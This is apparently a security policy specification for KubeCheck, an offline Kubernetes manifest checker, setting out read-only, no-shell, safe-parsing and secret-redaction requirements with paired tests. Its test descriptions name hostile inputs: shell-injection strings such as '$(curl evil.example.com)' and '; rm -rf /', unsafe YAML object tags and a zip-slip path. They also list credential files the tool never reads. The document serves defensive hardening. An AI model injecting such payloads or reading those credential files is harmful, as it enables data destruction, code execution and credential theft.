# KubeCheck — Safe Execution Policy

**Document ID:** SAFE-EXEC-001 · **Status:** Normative — Approved · **Version:** 1.0.0 · **Owner:** Secure CLI Implementation · **Last reviewed:** 2026-10-31

This document defines the safe execution contract for KubeCheck. It states, in enforceable terms, exactly what the tool is permitted to do, what it is prohibited from doing, and how any change that weakens the safety guarantees is reviewed. It is the operational counterpart to the threat model: the threat model identifies what can go wrong, and this policy specifies the controls that prevent each of those threats from materializing. Every requirement in this document is identified with the prefix `SAFE-EXEC-REQ-NNN`, every prohibited behavior with `PROHIBITED-NNN`, every approved exception with `EXCEPTION-NNN`, and every safety-weakening change with a review process described in the final section. Each requirement is paired with at least one test that verifies it, because a safety policy that is not tested is a safety policy that will silently erode.

The policy is written as a single continuous contract rather than as a checklist, because safety is not achieved by a collection of independent rules — it is achieved by a coherent set of guarantees that reinforce each other. The read-only default makes the file-traversal policy meaningful; the no-shell-execution requirement makes the manifest- content redaction meaningful; the resource limits make the cancellation behavior meaningful. The sections that follow develop these guarantees in the order a user's data flows through the tool: what the tool reads, what the tool does with what it reads, what the tool produces, and how the tool behaves when something goes wrong.

## The read-only default and the documented write set

The first and most fundamental guarantee is that KubeCheck is **read-only by default**. The `analyze` command, the `version` command, and the `explain` command do not write to any file. They do not create temporary files, they do not modify the manifest, they do not update the knowledge bundle, they do not write to a cache directory, and they do not touch the user's home directory. `SAFE-EXEC-REQ-001` requires this read-only behavior and `SAFE-EXEC-REQ-002` requires that the tool expose a `--dry-run` equivalent behavior in every command that could conceivably write, so that the user can verify before acting.

The only commands that write are the bundle-management subcommands (`bundle activate`, `bundle import`, `bundle export`, and any future editing feature). These commands write exclusively to the documented write set, which is `SAFE-EXEC-REQ-003`: the report stream (`stdout`), the log stream (`stderr`), and the user's local bundle store at the platform-specific location (`$XDG_DATA_HOME/kubecheck/` on Linux, `~/Library/Application Support/kubecheck/` on macOS, `%LOCALAPPDATA%\kubecheck\` on Windows). No other file is written. `SAFE-EXEC-REQ-004` requires that the bundle store be created with user-only permissions (mode `0700` on POSIX, equivalent ACL on Windows) and that every file within it be created with mode `0600`.

`SAFE-EXEC-REQ-005` requires that the tool never modify an input file, even if the user runs an editing command. If a future editing feature is approved, the tool writes the patched manifest to a new path or to `stdout`, never to the input path in place, unless the user explicitly requests in-place editing with a separate flag and the flag is documented as destructive. `SAFE-EXEC-REQ-006` requires that every file the tool creates be cleaned up on exit, including on abnormal exit, unless the file is part of the persistent bundle store. A crash that leaves a temporary file behind is a defect, and `SAFE-EXEC-REQ-007` requires that temporary files be created with `O_TMPFILE` (Linux) or `O_CREAT|O_EXCL` (POSIX) or `CreateFile` with `CREATE_NEW` (Windows) and be deleted in a `defer` or `finally` block that runs on both success and failure.

The test for these requirements is straightforward: run the full acceptance suite under a syscall tracer, collect every file that is opened for writing, and assert that the set matches the documented write set exactly. `SAFE-EXEC-TEST-001` runs the `analyze` command and asserts that no file in the write set is touched; `SAFE-EXEC-TEST-002` runs `bundle activate` and asserts that only the bundle store is touched; `SAFE-EXEC-TEST-003` runs a command that fails mid-execution and asserts that no temporary file remains.

## No implicit Kubernetes API access and no kubeconfig use

The second fundamental guarantee is that KubeCheck **does not connect to a Kubernetes cluster and does not read the user's cluster credentials**. `SAFE-EXEC-REQ-008` requires that the tool never make a network connection to a Kubernetes API server, never read `KUBECONFIG`, never read the default kubeconfig file (`~/.kube/config`), never read a service-account token from `/var/run/secrets/kubernetes.io/serviceaccount/`, and never read cloud-provider credential files. `SAFE-EXEC-REQ-009` requires that the tool never set or consult the `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables.

The tool's offline guarantee (`NET-REQ-001`) already implies this, but the safe-execution policy states it explicitly because the failure mode is subtle. A developer who adds a "cluster-aware" feature and casually imports a Kubernetes client library would reintroduce the risk without any of the review processes noticing, because the change would not look like a network feature — it would look like a "convenience" feature. `SAFE-EXEC-REQ-010` therefore requires that no Kubernetes client library appear in the dependency set of the core engine. Any dependency whose package name matches the well-known Kubernetes client library names (`client-go`, `kubernetes`, `@kubernetes/client-node`, `k8s.io/client-go`) is a build-time rejection, and the dependency review process (`SAFE-EXEC-REQ-011`) must reject any PR that adds one.

The test is a canary test: `SAFE-EXEC-TEST-004` sets `KUBECONFIG` to a path that contains a fake kubeconfig with a canary credential, runs the full `analyze` command, and asserts that the canary credential does not appear in any log, finding, or output. `SAFE-EXEC-TEST-005` sets `KUBERNETES_SERVICE_HOST` to a canary host and asserts that no connection to that host is attempted. `SAFE-EXEC-TEST-006` asserts that the dependency graph of the core engine contains no Kubernetes client library.

## No shell execution derived from manifest content

The third fundamental guarantee is that KubeCheck **never executes a shell command**. `SAFE-EXEC-REQ-012` requires that the tool never invoke `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`, or any other shell interpreter, whether directly or through a library wrapper (`os.system`, `subprocess.Popen` with `shell=True`, `exec`, `eval`, `Runtime.exec`, and equivalents in any language). `SAFE-EXEC-REQ-013` requires that the tool never invoke any external command at all, whether derived from manifest content or from a hard-coded list, except for the explicitly approved exceptions listed below.

The approved exceptions are `EXCEPTION-001` (the `git` binary, invoked only by the optional `bundle export --to-repo` command, with a hard-coded argument list that does not include any manifest-derived value) and `EXCEPTION-002` (the `gpg` binary, invoked only by the optional signature-verification fallback when the built-in verifier is unavailable, with a hard-coded argument list). Both exceptions are reviewed annually and both are removed if the built-in functionality reaches feature parity.

The test is a static-analysis gate plus a dynamic test. `SAFE-EXEC-TEST-007` runs a static analyzer that rejects any call to `os.system`, `subprocess`, `exec`, `eval`, `system`, `popen`, and their language-specific equivalents in core modules. `SAFE-EXEC-TEST-008` supplies a manifest with shell metacharacters in every field value (`; rm -rf /`, `$(curl evil.example.com)`, backticks, pipe characters, `&&`, `||`) and asserts that no subprocess is created and no shell command is executed. `SAFE-EXEC-TEST-009` asserts that the exceptions `EXCEPTION-001` and `EXCEPTION-002` are the only call sites that invoke an external binary, and that the arguments are constant.

## No arbitrary code execution through YAML tags, rules, templates, or plugins

The fourth fundamental guarantee is that KubeCheck **never executes attacker-supplied code**. This is the requirement that underpins all of the parsing and rule-engine safety requirements elsewhere in the documentation set, but the safe-execution policy states it as a single enforceable contract. `SAFE-EXEC-REQ-014` requires that every input — manifest bytes, rule pack YAML, configuration YAML, bundle manifest YAML — be parsed in safe mode with no constructor resolution, no host-language object instantiation, and no implicit code execution. `SAFE-EXEC-REQ-015` requires that rules be declarative data evaluated by a fixed interpreter, not code loaded into the process. `SAFE-EXEC-REQ-016` requires that the rule expression language have no escape hatches: no reflection, no FFI, no class loading, no I/O, no assignment, no side effects. `SAFE-EXEC-REQ-017` requires that templates (if any) be evaluated by the same restricted interpreter, not by a full templating engine.

The MVP has no plugin mechanism. If a plugin mechanism is approved in a future release, `SAFE-EXEC-REQ-018` requires that plugins be isolated from the core engine, that they receive only the NIR, inventory, and relationship graph (never raw bytes, file paths, or bundle internals unless explicitly required and documented), that their outputs be validated against the finding schema and constrained to their authorized evidence classes, and that they be unable to cause network I/O or shell execution. `SAFE-EXEC-REQ-019` requires that any such mechanism be reviewed as a safety-weakening change under the process in the final section of this document.

The tests are the parser adversarial corpus (`SAFE-EXEC-TEST-010`), the rule-pack validation suite (`SAFE-EXEC-TEST-011`), and the expression-language escape-hatch tests (`SAFE-EXEC-TEST-012`). The parser adversarial corpus includes `!!python/object/apply`, `!!ruby/object`, `!!java/object`, `!!php/object`, and equivalents for every language runtime the tool might encounter, and the test asserts that none of them cause code execution. The rule-pack validation suite runs the four-stage validation pipeline from `RULE-SPEC-REQ-064` and asserts that every malicious rule pack is rejected before activation. The expression-language tests attempt to access the filesystem, the network, the environment, and the process state through the expression language, and assert that every attempt is rejected at parse time.

## Safe file traversal, symlink policy, path validation, and stdin

The fifth guarantee is that KubeCheck **reads only what the user supplied and reads it safely**. `SAFE-EXEC-REQ-020` requires root confinement: every admitted file must resolve to a path that is a descendant of an explicitly supplied root, after symbolic-link resolution. A path that escapes the root is rejected and not read. `SAFE-EXEC-REQ-021` requires that symbolic links not be followed by default; following requires an explicit opt-in flag, and each resolved target is re-checked against the root confinement rule. `SAFE-EXEC-REQ-022` requires archive safety: archive members whose normalized path escapes the extraction root, or that are absolute paths, or that contain `..` segments after normalization, or that are device files, FIFOs, or other non-regular-file entries, are rejected. `SAFE-EXEC-REQ-023` requires stdin to be treated as a single stream with no path; it cannot be used to resolve relative paths for other inputs, and it is subject to the same size and resource limits as file input.

`SAFE-EXEC-REQ-024` requires that the tool never read any file not explicitly supplied by the user or not part of the documented configuration and bundle discovery. In particular, it never reads `/proc/self/environ`, `/proc/self/maps`, `/etc/shadow`, `/etc/passwd`, or any credential file. `SAFE-EXEC-REQ-025` requires that the tool's configuration file discovery be restricted to the documented locations (the `--config` flag, the project-level `.kubecheck.yaml` in the current directory, and the user-level config in the platform-specific config directory) and that it never traverse the parent directory tree searching for a config file beyond those locations.

The tests are the traversal corpus (`SAFE-EXEC-TEST-013`), the symlink corpus (`SAFE-EXEC-TEST-014`), the zip-slip corpus (`SAFE-EXEC-TEST-015`), and the config-discovery test (`SAFE-EXEC-TEST-016`). The traversal corpus includes paths with `../`, absolute paths, Windows drive-prefixed paths, UNC paths, and mixed separators, and asserts that every attempt is rejected. The symlink corpus creates a symlink inside the root pointing outside the root and asserts that the target is not followed by default. The zip-slip corpus creates an archive with a member named `../../etc/passwd` and asserts that the member is rejected. The config-discovery test places a config file in `/tmp` and runs the tool from `/tmp/subdir` and asserts that the file is not read.

## Resource limits and cancellation

The sixth guarantee is that KubeCheck **does not consume unbounded resources and can be interrupted**. `SAFE-EXEC-REQ-026` requires that every input be subject to the limits defined in `REQUIREMENTS_AND_NFRS.md` §7 and `YAML_PARSING_AND_EDGE_CASES.md` §13: per-input-unit size, per-document size, per-scalar size, document count, nesting depth, alias count, resolved-node count, mapping pairs, sequence items, wall-clock time, and aggregate memory. `SAFE-EXEC-REQ-027` requires that every limit be enforced **before** the resource is allocated, not after. `SAFE-EXEC-REQ-028` requires that exceeding a limit produce a structured governor finding and terminate the affected unit's processing, not crash the process or hang.

`SAFE-EXEC-REQ-029` requires that the tool honor `SIGINT` and `SIGTERM` within a documented grace period (default five seconds), emit the findings collected so far, and exit with a documented cancellation exit code. `SAFE-EXEC-REQ-030` requires that cancellation be propagated to every stage of the pipeline, including the parser, the rule engine, and the graph builder, so that a cancelled invocation does not continue consuming resources in a background goroutine or thread.

The tests are the limit-enforcement suite (`SAFE-EXEC-TEST-017`) and the cancellation suite (`SAFE-EXEC-TEST-018`). The limit-enforcement suite runs the adversarial corpus at and above every limit and asserts that the tool produces a structured finding rather than a crash or a hang. The cancellation suite sends `SIGINT` mid-parse, mid-rule-evaluation, and mid-graph-construction, and asserts that the tool exits within the grace period with the correct exit code and without leaving orphaned processes.

## Safe temporary-file creation and cleanup

The seventh guarantee is that KubeCheck **does not create temporary files during analysis**, and any temporary file created by the bundle-management commands is created safely and cleaned up. `SAFE-EXEC-REQ-031` requires that the `analyze` command not create any temporary file; intermediate data is held in memory only. `SAFE-EXEC-REQ-032` requires that any temporary file created by the bundle-management commands be created in the bundle store's `tmp/` directory (not in the system temporary directory, which may be world-readable), with `O_CREAT|O_EXCL` and mode `0600`, and be deleted on exit.

`SAFE-EXEC-REQ-033` requires that a temporary file never contain manifest content, secret values, or any data that could leak if the file is left behind. A crash during bundle activation leaves at most a temporary bundle file, which contains no manifest data. `SAFE-EXEC-REQ-034` requires that temporary files be named with a random suffix from a cryptographically secure random source, so that a local attacker cannot predict the name and create a symlink at that name (the classic `symlink attack` against predictable temporary file names).

The tests are the write-set audit (`SAFE-EXEC-TEST-019`) and the temp-file cleanup test (`SAFE-EXEC-TEST-020`). The write-set audit runs every command under a syscall tracer and asserts that the set of files created matches the documented set. The temp-file cleanup test kills the process with `SIGKILL` during a bundle-management operation and asserts that the next run of the tool finds no orphaned temporary file, or, if it does, cleans it up before proceeding.

## Output escaping for terminals, JSON, and logs

The eighth guarantee is that KubeCheck **does not produce output that is misinterpreted by the consumer**. `SAFE-EXEC-REQ-035` requires that human-readable output use only printable characters from the ASCII range and, where the output includes Unicode from the manifest, use the original code points without normalization. `SAFE-EXEC-REQ-036` requires that human-readable output contain no ANSI escape sequences, no terminal control sequences, no carriage returns, and no other terminal-specific control characters. The only exception is the documented color coding, which is disabled automatically when `NO_COLOR` is set, when the output is not a TTY, and when the `--no-color` flag is passed. `SAFE-EXEC-REQ-037` requires that the JSON output be valid JSON with the canonical field ordering defined in `docs/output/JSON_SCHEMA.md`, that every string field be properly escaped, and that no field contain raw control characters.

`SAFE-EXEC-REQ-038` requires that logs be written to `stderr` only, never to `stdout`, so that the report consumer is not exposed to log content. `SAFE-EXEC-REQ-039` requires that log messages escape control characters and that they never include the raw value of a manifest scalar unless the value is explicitly logged at a documented debug level with the value classified as non-secret. `SAFE-EXEC-REQ-040` requires that the report and the logs never emit a byte sequence that a downstream parser could interpret as a format marker — for example, a log line never begins with `{` if the log is being consumed by a JSON parser.

The tests are the output-escaping suite (`SAFE-EXEC-TEST-021`), the terminal-control test (`SAFE-EXEC-TEST-022`), and the stream-separation test (`SAFE-EXEC-TEST-023`). The output-escaping suite supplies a manifest with every control character, every ANSI escape sequence, every Unicode edge case, and every JSON-special character, and asserts that the output is well-formed and that no control sequence appears in the human-readable output. The terminal-control test captures the output to a file, re-reads it with a non-TTY reader, and asserts that the content matches the TTY-rendered content. The stream-separation test captures `stdout` and `stderr` separately and asserts that the report schema validator accepts `stdout` and that no report data appears in `stderr`.

## Secret redaction and error-message hygiene

The ninth guarantee is that KubeCheck **does not leak secrets**. `SAFE-EXEC-REQ-041` requires that the tool identify secret-bearing fields (defined in `docs/security/THREAT_MODEL.md`) and redact them in every output channel — findings, logs, error messages, crash reports, and the report header. `SAFE-EXEC-REQ-042` requires that the redaction be applied at the point where the value is read from the NIR, so that a future code path that forgets to redact is a compile-time error rather than a runtime leak. The implementation may use a `Secret<T>` wrapper type whose `Display`, `Debug`, and `Serialize` implementations emit the redaction placeholder.

`SAFE-EXEC-REQ-043` requires that error messages never include the value of the offending scalar. An error message may include the field path, the expected type, the actual type, and the error code, but never the value. `SAFE-EXEC-REQ-044` requires that the engine scan every error message and every remediation text against the secret-bearing values from the current input and reject the message if a match is found (`RCA-REMED-REQ-052`).

`SAFE-EXEC-REQ-045` requires that a crash report include only the document index, the last parsed location, the error class, and the engine version. It never includes the manifest content, the NIR, or any scalar value. `SAFE-EXEC-REQ-046` requires that the tool never write manifest content to a temporary file, to a log file, to a cache, or to any location outside the report stream.

The tests are the secret-bearing corpus (`SAFE-EXEC-TEST-024`), the error-message audit (`SAFE-EXEC-TEST-025`), and the crash-report audit (`SAFE-EXEC-TEST-026`). The secret-bearing corpus includes canary secret values in `Secret.data`, `Secret.stringData`, sensitive-named fields, TLS key material, and annotation values, and asserts that the canary values do not appear in `stdout`, `stderr`, or any temporary file. The error-message audit runs the malformed corpus and asserts that no error message echoes a scalar value. The crash-report audit runs the crash corpus and asserts that no crash report contains a scalar value.

## File permissions and platform-specific behavior

The tenth guarantee is that KubeCheck **creates files with restrictive permissions and behaves consistently across platforms**. `SAFE-EXEC-REQ-047` requires that every file the tool creates have mode `0600` on POSIX systems (user read and write only) and an equivalent restrictive ACL on Windows. Every directory the tool creates has mode `0700` on POSIX systems. `SAFE-EXEC-REQ-048` requires that the tool check the permissions of an existing file before reading it and refuse to read a file whose permissions allow read access by `other` if the file is a knowledge bundle or a configuration file — this prevents a user from being tricked into activating a bundle that a local attacker can modify.

`SAFE-EXEC-REQ-049` requires that the tool behave consistently across Linux, macOS, and Windows for the operations that affect safety: file discovery, symlink resolution, case sensitivity, and path separator normalization. A path that is rejected on Linux must be rejected on Windows, and vice versa, even if the underlying filesystem would accept it. `SAFE-EXEC-REQ-050` requires that the tool not assume case-sensitive path resolution and that it reject a path that would collide with another supplied path under case-insensitive comparison.

The tests are the permission suite (`SAFE-EXEC-TEST-027`) and the cross-platform consistency suite (`SAFE-EXEC-TEST-028`). The permission suite runs the tool under `strace`/`dtruss`/Sysinternals and asserts that every created file has the correct mode or ACL. The cross-platform consistency suite runs the full acceptance suite on each supported platform and asserts that the finding set is identical (modulo the documented platform-specific error codes) and that path handling behaves identically.

## Optional future features that require explicit user authorization

The eleventh guarantee is that **any feature that weakens the safety guarantees is gated behind explicit user authorization**. `SAFE-EXEC-REQ-051` requires that the following future features, if they are ever introduced, be gated behind an explicit flag, require documented opt-in, and emit a warning to `stderr` on activation: network access in the analysis path (never permitted); reading `KUBECONFIG` (never permitted); executing external commands (only the approved exceptions); plugin loading (subject to `SAFE-EXEC-REQ-018`); automatic bundle update checks (never permitted); telemetry (never permitted); manifest modification (subject to `SAFE-EXEC-REQ-005`); and arbitrary file writing outside the documented write set (never permitted).

`SAFE-EXEC-REQ-052` requires that any feature that would weaken a guarantee be reviewed under the process in the final section of this document, and that it be approved by the Security Architecture owner, the Software Architecture owner, and the Product Architecture owner. `SAFE-EXEC-REQ-053` requires that such a feature be disabled by default, documented as a safety-relevant feature, and accompanied by a clear statement of what it weakens and why the user might want to enable it.

The test for these requirements is the feature-flag audit (`SAFE-EXEC-TEST-029`), which runs the tool with every feature flag in its default state and asserts that the tool's behavior matches the safety guarantees, and which runs the tool with each flag enabled and asserts that the flag's effect is documented and that the warning is emitted.

## Safe behavior when configuration or knowledge data is malformed

The twelfth guarantee is that KubeCheck **fails safe when configuration or knowledge data is malformed**. `SAFE-EXEC-REQ-054` requires that a malformed configuration file cause a usage error with exit code `2`, not a silent fallback to defaults and not a partial application. A configuration file that contains an unknown key is rejected; a configuration file that contains a value of the wrong type is rejected; a configuration file that contains a secret value in a field that is not secret-bearing is rejected if the field is redacted in the output.

`SAFE-EXEC-REQ-055` requires that a malformed bundle manifest cause the bundle to be rejected with a structured error naming the field and the reason. The bundle loader does not attempt a best-effort interpretation. `SAFE-EXEC-REQ-056` requires that a malformed rule pack cause the affected rules to be disabled and a structured `ENGINE-RULE-INVALID` finding to be emitted, and that the rest of the bundle remain loadable unless the rule pack declares the rule as `required: true`. `SAFE-EXEC-REQ-057` requires that a corrupt active bundle cause the tool to fail closed: the analysis does not proceed with the corrupt bundle, the prior bundle remains active if one exists, and the tool emits a structured error naming the corruption and the recovery procedure (`TEST-REQ-011`, `TEST-REQ-012`).

The tests are the malformed-config suite (`SAFE-EXEC-TEST-030`), the malformed-bundle suite (`SAFE-EXEC-TEST-031`), and the corrupt-bundle recovery suite (`SAFE-EXEC-TEST-032`). The malformed-config suite supplies a config file with every type of error and asserts that each error produces a usage error and that the tool does not proceed with a partial configuration. The malformed-bundle suite supplies a bundle manifest with every type of error and asserts that each error produces a structured rejection. The corrupt-bundle recovery suite truncates the active bundle, corrupts a byte, and deletes a file, and asserts that the tool fails closed and that the recovery procedure restores the prior bundle.

## Prohibited behaviors, approved exceptions, and the safety-weakening review process

The policy closes with the catalog of prohibited behaviors, the catalog of approved exceptions, and the process for reviewing any change that would weaken a safety guarantee. The prohibited behaviors are, in summary: any network access in the analysis path (`PROHIBITED-001`); any read of `KUBECONFIG`, `KUBERNETES_SERVICE_HOST`, or credential files (`PROHIBITED-002`); any shell execution derived from manifest content (`PROHIBITED-003`); any arbitrary object construction through YAML tags (`PROHIBITED-004`); any execution of attacker-supplied code through rules, templates, or plugins (`PROHIBITED-005`); any path traversal or symlink following outside the root (`PROHIBITED-006`); any file write outside the documented write set (`PROHIBITED-007`); any secret value in logs, findings, error messages, or crash reports (`PROHIBITED-008`); any terminal control sequence in human-readable output (`PROHIBITED-009`); and any automatic modification of the user's manifest (`PROHIBITED-010`).

The approved exceptions are `EXCEPTION-001` (`git` for `bundle export --to-repo` with constant arguments) and `EXCEPTION-002` (`gpg` for the signature-verification fallback with constant arguments). Both exceptions are reviewed annually, both are documented in the user-facing documentation, and both are removed if the built-in functionality reaches feature parity.

`SAFE-EXEC-REQ-058` requires that any change that would weaken a safety guarantee be proposed as a governance ADR under `ADRP-REQ-001` and reviewed under the process that follows. The process has five steps. The first step is **proposal**, in which the change is described in an ADR with the guarantee it weakens, the reason the change is necessary, the alternative approaches considered, and the mitigation that would preserve as much of the guarantee as possible. The second step is **security review**, in which the Security Architecture owner reviews the proposal against the threat model and identifies any new threats the change would introduce. The third step is **architecture review**, in which the Software Architecture owner reviews the implementation plan for correctness and for interaction with existing safety mechanisms. The fourth step is **product review**, in which the Product Architecture owner reviews the user-facing implications and confirms that the change is gated behind explicit user authorization and documented in the user-facing limitations document. The fifth step is **approval**, in which all three owners approve the ADR and the change is recorded in the safety changelog (`SAFE-EXEC-REQ-059`).

`SAFE-EXEC-REQ-060` requires that a change that weakens a safety guarantee without an approved ADR be reverted and that the change's author be notified. `SAFE-EXEC-REQ-061` requires that the safety changelog record the ADR number, the guarantee weakened, the date of approval, and the removal date if the weakening is intended to be temporary. `SAFE-EXEC-REQ-062` requires that every approved weakening be reviewed at the next major-version release to determine whether it is still necessary or whether the guarantee can be restored.

## Open questions and unresolved decisions

Six open questions remain. `OPEN-SAFE-01` asks whether the `SAFE-EXEC-REQ-048` permission check should also apply to manifest files, not just to bundles and configuration files; the current design applies only to bundles and config because a manifest may legitimately be world-readable. `OPEN-SAFE-02` asks whether the temp-file cleanup test should verify cleanup after `SIGKILL` or only after `SIGTERM`; the current design verifies both, but the `SIGKILL` case is best-effort because the process cannot run cleanup code. `OPEN-SAFE-03` asks whether the tool should verify the permissions of the bundle store on every activation or only on the first creation; the current design verifies on every activation. `OPEN-SAFE-04` asks whether a future editing feature would inherit the read-only default or would require an explicit `--write` flag; the current design requires both. `OPEN-SAFE-05` asks whether the plugin mechanism, if approved, would share the process with the core engine or would run as a separate process; the current design does not decide, and `ADR-004` will resolve it. `OPEN-SAFE-06` asks whether the approval process for safety-weakening changes should include a public comment period for changes that affect the offline guarantee or the secret-redaction guarantee; the current design requires internal approval only.

## Definition of done

This document is complete when twelve conditions hold. The read-only default and the documented write set are specified with enforceable requirements and tests. The no-Kubernetes-API and no-kubeconfig guarantees are specified with canary tests. The no-shell-execution guarantee is specified with static-analysis and dynamic tests. The no-arbitrary-code-execution guarantee is specified across YAML tags, rules, templates, and plugins. The safe file traversal, symlink policy, path validation, and stdin guarantees are specified with a traversal corpus. The resource limits and cancellation guarantees are specified with limit-enforcement and cancellation tests. The safe temporary-file creation and cleanup guarantees are specified. The output escaping guarantees are specified for terminals, JSON, and logs. The secret-redaction and error-message hygiene guarantees are specified with the secret-bearing corpus and the error-message audit. The file permissions and platform-specific behavior guarantees are specified. The explicit-authorization requirement for future features is specified. The fail-safe behavior for malformed configuration and knowledge data is specified. The prohibited behaviors and approved exceptions are cataloged. The safety-weakening review process is specified with five steps, three owners, and a safety changelog. Every requirement has a stable ID (`SAFE-EXEC-REQ-NNN`), every prohibited behavior has a stable ID (`PROHIBITED-NNN`), every approved exception has a stable ID (`EXCEPTION-NNN`), and every test has a stable ID (`SAFE-EXEC-TEST-NNN`). The document does not claim any implementation status, and it does not promise that any guarantee is fully achieved — it specifies what must be true for the guarantee to be considered achieved, and it requires that the tests prove it.

The safe-execution policy is not a static document. It is a contract that the tool's behavior must satisfy on every release, and it is the document that a security reviewer reads when deciding whether to trust the tool. A policy that is not enforced by tests is a policy that will erode, and the tests in this document are what keep it honest.
